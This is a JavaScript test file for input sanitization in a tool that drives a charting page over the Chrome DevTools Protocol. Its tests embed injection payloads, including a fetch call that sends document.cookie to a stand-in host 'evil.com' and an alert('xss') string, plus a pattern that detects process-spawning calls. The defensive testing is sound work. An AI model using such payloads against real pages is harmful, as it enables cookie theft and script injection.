/**
 * Tests for CDP input sanitization utilities and hardening invariants of the
 * review build: safeString(), requireFinite(), per-module validation, a
 * source-level audit for unsafe interpolation, localhost pinning, and the
 * fixed screenshot output path.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { safeString, requireFinite } from '../src/connection.js';
import { setSymbol, setTimeframe, setVisibleRange } from '../src/core/chart.js';
import { drawShape } from '../src/core/drawing.js';

// ── Mock helpers ─────────────────────────────────────────────────────────

function mockEval() {
  const calls = [];
  const fn = async (expr) => { calls.push(expr); return undefined; };
  fn.calls = calls;
  return fn;
}

function mockDeps(overrides = {}) {
  const evaluate = mockEval();
  return {
    _deps: {
      evaluate,
      evaluateAsync: evaluate,
      waitForChartReady: async () => true,
      getChartApi: async () => 'window.__api',
      ...overrides,
    },
    evaluate,
  };
}

// ── safeString() ─────────────────────────────────────────────────────────

describe('safeString() — CDP injection prevention', () => {
  it('wraps normal strings in double quotes', () => {
    assert.equal(safeString('hello'), '"hello"');
  });

  it('wraps in double quotes so single quotes are safe', () => {
    assert.equal(safeString("test'injection"), '"test\'injection"');
  });

  it('escapes double quotes', () => {
    assert.equal(safeString('test"injection'), '"test\\"injection"');
  });

  it('neutralizes template literals by wrapping in double quotes', () => {
    const parsed = JSON.parse(safeString('${alert(1)}'));
    assert.equal(parsed, '${alert(1)}');
  });

  it('escapes backslashes', () => {
    assert.equal(safeString('test\\injection'), '"test\\\\injection"');
  });

  it('escapes newlines and control chars', () => {
    const result = safeString('line1\nline2\r\ttab');
    assert.ok(!result.includes('\n'));
    assert.ok(result.includes('\\n'));
  });

  it('handles empty string', () => {
    assert.equal(safeString(''), '""');
  });

  it('coerces non-strings to strings', () => {
    assert.equal(safeString(123), '"123"');
    assert.equal(safeString(null), '"null"');
    assert.equal(safeString(undefined), '"undefined"');
  });

  it('prevents classic CDP injection payload', () => {
    const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });

  it('prevents template literal injection', () => {
    const payload = '`; process.exit(); `';
    const parsed = JSON.parse(safeString(payload));
    assert.equal(parsed, payload);
  });
});

// ── requireFinite() ──────────────────────────────────────────────────────

describe('requireFinite() — numeric validation', () => {
  it('passes finite numbers through', () => {
    assert.equal(requireFinite(42, 'test'), 42);
    assert.equal(requireFinite(3.14, 'test'), 3.14);
    assert.equal(requireFinite(-100, 'test'), -100);
    assert.equal(requireFinite(0, 'test'), 0);
  });

  it('coerces numeric strings', () => {
    assert.equal(requireFinite('42', 'test'), 42);
  });

  it('rejects NaN', () => {
    assert.throws(() => requireFinite(NaN, 'price'), /price must be a finite number/);
  });

  it('rejects Infinity', () => {
    assert.throws(() => requireFinite(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => requireFinite(-Infinity, 'time'), /time must be a finite number/);
  });

  it('rejects non-numeric strings', () => {
    assert.throws(() => requireFinite('abc', 'value'), /value must be a finite number/);
  });

  it('rejects undefined', () => {
    assert.throws(() => requireFinite(undefined, 'x'), /x must be a finite number/);
  });

  it('includes bad value in error message', () => {
    assert.throws(() => requireFinite('oops', 'field'), /got: oops/);
  });
});

// ── chart.js — sanitized evaluate calls ──────────────────────────────────

describe('chart.js — sanitized evaluate calls', () => {
  it('setSymbol uses safeString in evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setSymbol({ symbol: 'NYMEX:CL1!', _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    assert.ok(call, 'setSymbol called');
    assert.ok(call.includes('"NYMEX:CL1!"'), 'symbol wrapped in double quotes via safeString');
    assert.ok(!call.includes("'NYMEX:CL1!'"), 'no single-quoted interpolation');
  });

  it('setSymbol sanitizes injection payload', async () => {
    const { _deps, evaluate } = mockDeps();
    const payload = "'; alert('xss'); //";
    await setSymbol({ symbol: payload, _deps });
    const call = evaluate.calls.find(c => c.includes('setSymbol'));
    assert.ok(call.includes(safeString(payload)), 'payload is JSON-escaped in evaluate call');
    assert.ok(!call.includes("setSymbol('"), 'no single-quoted interpolation');
  });

  it('setTimeframe uses safeString', async () => {
    const { _deps, evaluate } = mockDeps();
    await setTimeframe({ timeframe: '15', _deps });
    const call = evaluate.calls.find(c => c.includes('setResolution'));
    assert.ok(call.includes('"15"'), 'timeframe wrapped via safeString');
  });

  it('setVisibleRange validates from/to with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => setVisibleRange({ from: NaN, to: 100, _deps }),
      /from must be a finite number/,
    );
    await assert.rejects(
      () => setVisibleRange({ from: 100, to: Infinity, _deps }),
      /to must be a finite number/,
    );
  });

  it('setVisibleRange rejects an empty or inverted window', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => setVisibleRange({ from: 2000, to: 1000, _deps }),
      /must be greater than from/,
    );
    await assert.rejects(
      () => setVisibleRange({ from: 1000, to: 1000, _deps }),
      /must be greater than from/,
    );
  });

  it('setVisibleRange passes valid numbers to evaluate', async () => {
    const { _deps, evaluate } = mockDeps();
    await setVisibleRange({ from: 1700000000, to: 1700100000, _deps });
    const call = evaluate.calls.find(c => c.includes('zoomToBarsRange'));
    assert.ok(call, 'zoomToBarsRange called');
    assert.ok(call.includes('1700000000'), 'from value in call');
    assert.ok(call.includes('1700100000'), 'to value in call');
  });
});

// ── drawing.js — safeString + requireFinite + shape allowlist ────────────

describe('drawing.js — sanitized evaluate calls', () => {
  it('drawShape validates point coordinates with requireFinite', async () => {
    const { _deps } = mockDeps();
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: NaN, price: 100 }, _deps }),
      /point\.time must be a finite number/,
    );
    await assert.rejects(
      () => drawShape({ shape: 'horizontal_line', point: { time: 100, price: Infinity }, _deps }),
      /point\.price must be a finite number/,
    );
  });

  it('drawShape rejects shapes outside the fixed allowlist', async () => {
    const { _deps } = mockDeps();
    for (const bad of ['trend_line', 'rectangle', 'text', 'emoji', '']) {
      await assert.rejects(
        () => drawShape({ shape: bad, point: { time: 100, price: 50 }, _deps }),
        /shape must be one of/,
        `should reject shape="${bad}"`,
      );
    }
  });

  it('drawShape uses safeString for shape name', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 100, price: 50 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call, 'createShape called');
    assert.ok(call.includes('"horizontal_line"'), 'shape name via safeString');
  });

  it('drawShape uses validated coordinates and a fixed style', async () => {
    const { _deps, evaluate } = mockDeps();
    await drawShape({ shape: 'vertical_line', point: { time: 1700000000, price: 5000.5 }, _deps });
    const call = evaluate.calls.find(c => c.includes('createShape'));
    assert.ok(call.includes('1700000000'), 'time in call');
    assert.ok(call.includes('5000.5'), 'price in call');
    assert.ok(call.includes('overrides: {}'), 'style overrides are fixed, not caller-supplied');
  });
});

// ── Source-level audits ──────────────────────────────────────────────────

describe('source audit — no unsafe interpolation patterns', () => {
  const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
  const coreFiles = readdirSync(CORE_DIR).filter(f => f.endsWith('.js'));

  for (const file of coreFiles) {
    it(`${file} has no .replace(/'/g) manual escaping`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      assert.ok(!source.includes(".replace(/'/g,"),
        `${file} still uses manual quote escaping — use safeString() instead`);
    });
  }

  // Allowlist: compile-time constants that are safe to interpolate (API path
  // strings — never user input).
  const VULNERABLE_PATTERNS = [
    /evaluate\([^)]*'\$\{(?!CHART_API|apiPath|BARS_PATH)/,
  ];

  for (const file of coreFiles) {
    it(`${file} has no raw user input in evaluate() string literals`, () => {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      for (const pattern of VULNERABLE_PATTERNS) {
        assert.ok(!pattern.test(source),
          `${file} has raw interpolation in evaluate() — use safeString()`);
      }
    });
  }
});

describe('hardening invariants of the review build', () => {
  it('connection.js pins CDP to 127.0.0.1:9222 with no env override', () => {
    const source = readFileSync(new URL('../src/connection.js', import.meta.url), 'utf8');
    assert.ok(!source.includes('process.env'), 'no env-based CDP endpoint override');
    assert.ok(source.includes("CDP_HOST = '127.0.0.1'"), 'host pinned to loopback');
    assert.ok(source.includes('CDP_PORT = 9222'), 'port pinned');
  });

  it('capture.js exposes no caller-controlled output path or name', () => {
    const source = readFileSync(new URL('../src/core/capture.js', import.meta.url), 'utf8');
    assert.ok(!source.includes('filename'), 'no user-supplied name parameter');
    assert.ok(source.includes("'generated', 'screenshots'"), 'fixed output directory');
  });

  it('no core module shells out or self-updates', () => {
    const CORE_DIR = new URL('../src/core/', import.meta.url).pathname;
    for (const file of readdirSync(CORE_DIR).filter(f => f.endsWith('.js'))) {
      const source = readFileSync(join(CORE_DIR, file), 'utf8');
      assert.ok(!/child_process|execSync|spawn\(/.test(source),
        `${file} must not spawn processes in the review build`);
    }
  });
});
